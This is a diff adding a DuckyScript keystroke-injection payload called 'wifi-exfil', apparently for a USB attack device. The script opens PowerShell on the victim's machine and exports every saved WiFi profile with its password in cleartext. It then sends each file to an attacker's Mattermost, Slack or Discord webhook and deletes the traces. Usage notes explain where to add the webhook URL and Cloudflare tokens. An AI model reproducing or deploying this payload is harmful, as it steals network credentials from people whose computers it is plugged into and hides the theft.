@@ -1,0 +1,57 @@
+REM Title: wifi-exfil
+REM Author: AERMORed Team Pandas
+REM Description: Extracts the SSID and WiFi PSKs to xml files and send them to a Mattermost webhook endpoint.
+REM_BLOCK Usage:
+    You will need to create an incoming Mattermost webhook to receive the exfiltrated files. This
+    URL needs to be added to line 18. You may also use another webhook endpoint such as Slack or 
+    Discord.
+    
+    If you are using Cloudflare tunnels, you will need to update line 31 and 33 with your service
+    auth tokens.
+END_REM
+
+GUI r
+DELAY 2000
+STRING powershell
+ENTER
+DELAY 2000
+STRING $webhookUri = '<value>'
+ENTER
+STRING $guid = [guid]::NewGuid().ToString()
+ENTER
+STRING New-Item -Path $env:temp -Name $guid -ItemType "directory"
+ENTER
+STRING Set-Location -Path "$env:temp/$guid"
+ENTER
+STRING netsh wlan export profile key=clear;
+ENTER
+STRING Set-Location -Path $env:temp
+ENTER
+STRING $headers = @{
+STRING 'CF-Access-Client-Id' = '<value>'
+ENTER
+STRING 'CF-Access-Client-Secret' = '<value>'
+ENTER
+STRING 'Content-Type' = 'application/json'}
+ENTER
+STRING Get-ChildItem "$env:tmp/$guid" -File |
+ENTER
+STRING ForEach-Object {
+ENTER
+STRING $fileContent = Get-Content $_.FullName | Out-String
+ENTER
+STRING $Body = @{
+ENTER
+STRING 'text' = '```xml'  + "`n" + $fileContent + '```'
+ENTER
+STRING }
+ENTER
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Headers $headers -Body (ConvertTo-Json -InputObject $Body)
+ENTER
+STRING Start-Sleep -Milliseconds 300
+STRING }
+ENTER
+STRING Remove-Item -Path "$env:tmp/$guid" -Force -Recurse
+ENTER
+STRING exit
+ENTER
